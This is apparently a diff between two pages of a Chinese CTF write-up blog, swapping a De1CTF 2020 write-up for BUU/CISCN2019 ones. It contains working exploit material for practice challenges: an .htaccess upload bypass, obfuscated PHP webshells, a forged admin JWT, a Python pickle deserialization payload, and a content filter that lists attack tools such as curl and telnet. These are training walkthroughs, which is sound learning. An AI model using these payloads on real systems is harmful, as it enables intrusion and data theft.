@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="De1CTF 2020 WP, Web,CTF,Misc,JS,Python">
+    <meta name="keywords" content="immerse in BUU day2, Web,CTF,Misc,JS,Python">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>De1CTF 2020 WP | V1cuna&#39;s blog</title>
+    <title>immerse in BUU day2 | V1cuna&#39;s blog</title>
     <link rel="icon" type="image/png" href="https://cdn.jsdelivr.net/gh/V1cuna/v1cuna.github.io/V1cuna.png">
 
     <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/V1cuna/v1cuna.github.io/libs/awesome/css/all.css">
@@ -308,12 +308,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('https://cdn.jsdelivr.net/gh/V1cuna/v1cuna.github.io/medias/featureimages/6.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://cdn.jsdelivr.net/gh/V1cuna/v1cuna.github.io/medias/featureimages/23.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">De1CTF 2020 WP</h1>
+                    <h1 class="description center-align post-title">immerse in BUU day2</h1>
                 </div>
             </div>
         </div>
@@ -438,6 +438,10 @@
                                 <span class="chip bg-color">WP</span>
                             </a>
                         
+                            <a href="/tags/BUU/">
+                                <span class="chip bg-color">BUU</span>
+                            </a>
+                        
                     </div>
                     
                 </div>
@@ -450,7 +454,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2020-05-06
+                    2020-05-29
                 </div>
                 
 
@@ -459,7 +463,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    639
+                    924
                 </div>
                 
 
@@ -476,64 +480,83 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <p>这次队伍最后排了82名，继续加油哇。</p>
-<p>做的题有点少，有机会慢慢复现</p>
-<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="CheckIN"><a href="#CheckIN" class="headerlink" title="CheckIN"></a>CheckIN</h2><p>一个文件上传的题。</p>
-<pre><code>Server: Apache2.4.6 (CentOS) PHP/5.4.16
-X-Powered-By: PHP/5.4.16</code></pre><p>用户文件上传到: <code>/uploads/[md5(REMOTE_ADDR)]/</code>而所有发送的内容都是通过以下过滤器来完成的：</p>
-<pre><code class="php">$black = file_get_contents($tmp_name);
-if (!$tmp_name) {
-    $result1 ="???";
-}else if (!$name) {
-    $result1 ="filename cannot be empty!";
-}
-else if (preg_match("/ph|ml|js|cg/i", $name)) {
-    $result1 = "filename error";
-}
-else if (!in_array($_FILES["fileUpload"]['type'], $typeAccepted)) {
-    $result1 = 'filetype error';
-}
-else if (preg_match("/perl|pyth|ph|auto|curl|base|&gt;|rm|ruby|openssl|war|lua|msf|xter|telnet/i",$black)){
-    $result1 = "perl|pyth|ph|auto|curl|base|&gt;|rm|ruby|openssl|war|lua|msf|xter|telnet in contents!";
-}</code></pre>
-<p>发现可以上传.htaccess来绕过，并且由于支持多行语句执行（短命令），就比如说：</p>
-<pre><code>AddHandler application/x-httpd-p\
-hp .aaa</code></pre><p>基本思路有了，现在问题是<code>&lt;?php</code>标签，短标签<code>&lt;=</code>也不行。</p>
-<p>注意到前面apache和php，我们知道可以利用apache和mod_php，通过.htaccess来修改php.ini的指令</p>
-<pre><code>AddHandler application/x-httpd-p\
-hp .aaa
+                <h2 id="CISCN2019-华北赛区-Day1-Web2-ikun"><a href="#CISCN2019-华北赛区-Day1-Web2-ikun" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web2]ikun"></a>[CISCN2019 华北赛区 Day1 Web2]ikun</h2><p>知识点：<strong>逻辑漏洞，cookie伪造，python反序列化</strong></p>
+<p>登陆后是一个商城界面，发现视频下面写了：==爆破*站：资金募集 11540.0==</p>
+<p>==ikun们冲鸭,一定要买到lv6!!!==</p>
+<p>所以我们是要买Lv6的产品，翻了几页没有看到，可以通过python脚本来查找。</p>
+<p>我们发现相同等级的示意图是一样的，F12查看，发现图片的src就带有相应的等级。</p>
+<p><img src="https://i.loli.net/2020/05/29/vIT8RqYujtwp3Nh.png" alt="CISCN华北ikun1.png"></p>
+<p>用requests库查询即可带有lv6.png的页面即可</p>
+<pre><code class="python">import requests
+import time
+for i in range(1,200):
+    print(i)
+    url = 'http://132bc261-1688-4891-be1e-dc1f5ff82988.node3.buuoj.cn/shop?page={}'.format(i)
+    r = requests.get(url)
+    if 'lv6.png' in r.text:
+        print(i)
+        print("bingo")
+        break
+    if r.status_code == 429: //BUU会有访问频率限制
+        print("too fast")
+        time.sleep(2)</code></pre>
+<p>得到LV6在181页<img src="https://i.loli.net/2020/05/29/7Cwe6VTgivnZQya.png" alt="CISCN华北ikun2.png"></p>
+<p>注册账号，发现钱只有1k，不够，从network看一下交易过程有没有可以操作的参数。</p>
+<p>发现用了JWT的身份验证。</p>
+<p>同时发现在提交的过程中传了一个discount参数为0.8，根据前面购物界面的<code>“-%20”</code>推测这是折扣的数值，那我们将其修改成一个极小值再重发就ok了。</p>
+<p>但是提示：==该页面，只允许admin访问==，联系到前面的JWT，我们需要伪造admin身份。</p>
+<blockquote>
+<p>JSON Web Token（JWT）是一个非常轻巧的规范。这个规范允许我们使用JWT在用户和服务器之间传递安全可靠的信息。JWT常被用于前后端分离，可以和Restful API配合使用，常用于构建身份认证机制。</p>
+</blockquote>
+<p>JWT的数据格式分为三个部分： headers , payloads，signature(签名)，它们使用<code>.</code>点号分割。例如我这里的JWT为：<br>JWT与session的相同点是，它们都是存储用户信息；然而，Session是在服务器端的，而JWT是在客户端的。Session方式存储用户信息的最大问题在于要占用大量服务器内存，增加服务器的开销。而JWT方式将用户状态分散到了客户端中，可以明显减轻服务端的内存压力。Session的状态是存储在服务器端，客户端只有session id；而Token的状态是存储在客户端。</p>
+<pre><code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IlYxY3VuYSJ9.XkNYqo8PmtSXIH_24l03JPXv2wyidHfob_mUUPL-1UQ;</code></pre><p><img src="https://i.loli.net/2020/05/29/8hpsXDjLAVFgnrP.png" alt="Snipaste_2020-05-29_13-44-43.png"></p>
+<p>解密得到上图</p>
+<p><a href="https://github.com/brendan-rius/c-jwt-cracker" target="_blank" rel="noopener">c-jwt-crack</a>爆破一下密钥得<code>Secret is "1Kun"</code>，所以我们就可以伪造admin了</p>
+<pre><code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.40on__HQ8B2-wM1ZSwax3ivRK4j54jlaXv-1JjQynjo</code></pre><p>重发一下，F12，找到了<code>www.zip</code>下载下来发现是源码。</p>
+<p>审计Admin.py</p>
+<pre><code class="python">import tornado.web
+from sshop.base import BaseHandler
+import pickle
+import urllib
 
-p\
-hp_value short_open_tag 1</code></pre><p>那么我们就能把aaa扩展当做php来执行，最后上马或者直接读取就可以</p>
-<pre><code>/uploads/xxxxxxxxx/check.aaa?cmd=cat%20/flag</code></pre><p>flag：<code>De1ctf{cG1_cG1_cg1_857_857_cgll111ll11lll}</code></p>
-<h2 id="Hard-Pentest-1"><a href="#Hard-Pentest-1" class="headerlink" title="Hard_Pentest_1"></a>Hard_Pentest_1</h2><p>一开始单纯的以为是P神的无字母数字webshell。。。后来发现分号也GG了</p>
-<p>绕过：php的标签，这个用短标签就可以</p>
-<pre><code class="php">&lt;?= a ?&gt; 
-&lt;?php echo $a ?&gt;</code></pre>
-<pre><code class="php">&lt;?= $_=[] ?&gt; 
-&lt;?= $_=@"$_" #Array ?&gt;
-&lt;?= $_=$_[('!'=='@')] #('!'=='@') results in 0 ?&gt;
 
-&lt;?= $__ = $_ ?&gt;
-&lt;?= @$____ = $__++ + $__++ + $__++ + $__++ + $__++ + $__++#G ?&gt;
-&lt;?= $_______ = "_".$__ #_G ?&gt;
+class AdminHandler(BaseHandler):
+    @tornado.web.authenticated
+    def get(self, *args, **kwargs):
+        if self.current_user == "admin":
+            return self.render('form.html', res='This is Black Technology!', member=0)
+        else:
+            return self.render('no_ass.html')
 
-&lt;?= $__ = $_ ?&gt;
-&lt;?= @$____ = $__++ + $__++ + $__++ + $__++ #E ?&gt;
-&lt;?= $_______ .= $__ #_GE ?&gt;
+    @tornado.web.authenticated
+    def post(self, *args, **kwargs):
+        try:
+            become = self.get_argument('become')
+            p = pickle.loads(urllib.unquote(become))
+            return self.render('form.html', res=p, member=1)
+        except:
+            return self.render('form.html', res='This is Black Technology!', member=0)
+</code></pre>
+<p>我们注意到调用了pickle库，并且调用了<code>pickle.loads()</code>函数，而最后的<code>become</code>参数可控</p>
+<p>EXP：</p>
+<pre><code class="python">#python3.6.8
+import pickle
+import urllib.parse
 
-&lt;?= $__ = $_ ?&gt;
-&lt;?= @$____ = $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++ #T ?&gt;
-&lt;?= $_______ .= $__ #_GET ?&gt;
+class payload(object):
+    def __reduce__(self):
+       return (eval, ("open('/flag.txt','r').read()",))
 
-&lt;?= ${$_______}["_"](${$_______}["__"]) # $_GET['_']($_GET['__']) ?&gt;</code></pre>
-<p>webshell如图，最后<code>?_=system&amp;__=ls</code></p>
-<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="大杂烩"><a href="#大杂烩" class="headerlink" title="大杂烩"></a>大杂烩</h2><p>给了一个pcap，按照大小追踪HTTP流</p>
-<p><img src="https://i.loli.net/2020/05/13/8Oj64XLEIPSDpgw.jpg" alt="Snipaste_2020-05-06_13-12-13.jpg"></p>
-<p>把png提取出来（可以直接复制hex码），发现是一个网盘的url，下载。</p>
-<p>windows打不开这个憨憨word文档，改为rar成功拿到压缩包，爆破出密码DE34Q1。</p>
-<p>图片binwalk，一开始虚拟机出了点问题，同学给我的压缩包不全。。。但是自己binwalk出的包就能看出ntfs流。。。555提取出来就好了</p>
-<h2 id="MC-Join"><a href="#MC-Join" class="headerlink" title="MC_Join"></a>MC_Join</h2><p>脚本和Nu1L师傅们的差不多<a href="https://wx.zsxq.com/dweb2/index/group/824215518412，可读性太差了。。。。直接看他们的把" target="_blank" rel="noopener">https://wx.zsxq.com/dweb2/index/group/824215518412，可读性太差了。。。。直接看他们的把</a></p>
+a = pickle.dumps(payload())
+s = urllib.parse.quote(a)
+print (s)</code></pre>
+<h2 id="CISCN2019-华北赛区-Day1-Web1-Dropbox"><a href="#CISCN2019-华北赛区-Day1-Web1-Dropbox" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web1]Dropbox"></a>[CISCN2019 华北赛区 Day1 Web1]Dropbox</h2><p>知识点：<strong>Phar反序列化</strong></p>
+<p>注入简单尝试了一下不行。</p>
+<p>注册，上传简单的phpinfo();图片马，ok。</p>
+<p>filename可控，任意文件下载（flag.txt存在但是无法下载）。</p>
+<h2 id="Reference："><a href="#Reference：" class="headerlink" title="Reference："></a>Reference：</h2><p>[1] 认识JWT<a href="https://www.cnblogs.com/cjsblog/p/9277677.html" target="_blank" rel="noopener">https://www.cnblogs.com/cjsblog/p/9277677.html</a></p>
+<p>[2]JWT破解绕过<a href="https://delcoding.github.io/2018/03/jwt-bypass/" target="_blank" rel="noopener">https://delcoding.github.io/2018/03/jwt-bypass/</a></p>
+<p>[3]从0开始python反序列化<a href="https://zhuanlan.zhihu.com/p/89132768" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/89132768</a></p>
 <script>
         document.querySelectorAll('.github-emoji')
           .forEach(el => {
@@ -577,7 +600,7 @@ hp_value short_open_tag 1</code></pre><p>那么我们就能把aaa扩展当做php
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://hackyangtuo.top/posts/undefined.html">https://hackyangtuo.top/posts/undefined.html</a>
+                    <a href="https://hackyangtuo.top/posts/ccdc.html">https://hackyangtuo.top/posts/ccdc.html</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -623,6 +646,10 @@ hp_value short_open_tag 1</code></pre><p>那么我们就能把aaa扩展当做php
                                     <span class="chip bg-color">WP</span>
                                 </a>
                             
+                                <a href="/tags/BUU/">
+                                    <span class="chip bg-color">BUU</span>
+                                </a>
+                            
                         </div>
                     
                 </div>
@@ -666,26 +693,26 @@ hp_value short_open_tag 1</code></pre><p>那么我们就能把aaa扩展当做php
             <div class="article-badge left-badge text-color">
                 <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/posts/ccdc.html">
+                <a href="/posts/1fa2.html">
                     <div class="card-image">
                         
                         
-                        <img src="https://cdn.jsdelivr.net/gh/V1cuna/v1cuna.github.io/medias/featureimages/23.jpg" class="responsive-img" alt="immerse in BUU day2">
+                        <img src="https://cdn.jsdelivr.net/gh/V1cuna/v1cuna.github.io/medias/featureimages/4.jpg" class="responsive-img" alt="GKCTF复现">
                         
-                        <span class="card-title">immerse in BUU day2</span>
+                        <span class="card-title">GKCTF复现</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            [CISCN2019 华北赛区 Day1 Web2]ikun知识点：逻辑漏洞，cookie伪造，python反序列化
-登陆后是一个商城界面，发现视频下面写了：==爆破*站：资金募集 11540.0==
-==ikun们冲鸭,一定要买到lv6!
+                            WebMisc[GKCTF2020]Pokémon这个gba模拟器打开开金手指就可以了
+[GKCTF2020]code obfuscationHXD分析图片，binwalk得到压缩包，有密码，非伪加密。
+倾斜的二维码，用PS调正，粗糙修复
                         
                     </div>
                     <div class="publish-info">
                         <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2020-05-29
+                            <i class="far fa-clock fa-fw icon-date"></i>2020-05-31
                         </span>
                         <span class="publish-author">
                             
@@ -698,16 +725,8 @@ hp_value short_open_tag 1</code></pre><p>那么我们就能把aaa扩展当做php
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/CTF/">
-                        <span class="chip bg-color">CTF</span>
-                    </a>
-                    
-                    <a href="/tags/WP/">
-                        <span class="chip bg-color">WP</span>
-                    </a>
-                    
-                    <a href="/tags/BUU/">
-                        <span class="chip bg-color">BUU</span>
+                    <a href="/tags/CTF-WP/">
+                        <span class="chip bg-color">-CTF -WP</span>
                     </a>
                     
                 </div>
@@ -721,21 +740,23 @@ hp_value short_open_tag 1</code></pre><p>那么我们就能把aaa扩展当做php
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/posts/4c15.html">
+                <a href="/posts/undefined.html">
                     <div class="card-image">
                         
                         
-                        <img src="https://cdn.jsdelivr.net/gh/V1cuna/v1cuna.github.io/medias/featureimages/0.jpg" class="responsive-img" alt="GXYCTF2019重做">
+                        <img src="https://cdn.jsdelivr.net/gh/V1cuna/v1cuna.github.io/medias/featureimages/6.jpg" class="responsive-img" alt="De1CTF 2020 WP">
                         
-                        <span class="card-title">GXYCTF2019重做</span>
+                        <span class="card-title">De1CTF 2020 WP</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            Webpingpingping在昨天的https://www.hackyangtuo.top/posts/ab7.html#toc-heading-1写过了
-禁止套娃考察：git源码泄露，无参数RCE                
-啥都没
+                            这次队伍最后排了82名，继续加油哇。
+做的题有点少，有机会慢慢复现
+WebCheckIN一个文件上传的题。
+Server: Apache2.4.6 (CentOS) PHP/5.4.16
+X-Powered-By: PHP/5.4.16用户
                         
                     </div>
                     <div class="publish-info">
